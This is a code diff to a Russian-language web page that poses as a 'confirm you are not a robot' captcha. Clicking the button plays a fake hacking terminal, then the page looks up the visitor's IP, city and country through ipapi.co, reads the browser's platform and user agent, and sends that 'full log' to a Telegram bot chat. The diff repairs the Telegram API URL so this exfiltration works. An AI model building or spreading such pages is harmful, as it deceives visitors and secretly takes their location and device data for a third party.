@@ -18,6 +18,7 @@
     <div id="terminal"></div>
 
     <div id="captcha-box">
+         
         <img src="https://www.gstatic.com" width="80">
         <h2>Подтвердите, что вы не робот</h2>
         <button class="btn-verify" onclick="startHack()">Я не робот</button>
@@ -68,7 +69,7 @@
                 if (line.includes("CRITICAL")) p.className = "t-red";
                 term.appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 160)); / 
+                await new Promise(r => setTimeout(r, 160)); 
             }
 
             await sendFinalLogs();
@@ -84,12 +85,16 @@
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
+           
                 document.getElementById('user-ip').innerText = d.ip;
-                document.getElementById('user-geo').innerText = d.city;
+                document.getElementById('user-geo').innerText = d.city + ", " + d.country_name;
                 document.getElementById('user-os').innerText = navigator.platform;
 
+               
                 const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+                
+                 
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
                 await fetch(url);
             } catch (e) {
                 const backup = encodeURIComponent(`⚠️ Переход!\n📱 ${navigator.userAgent}`);
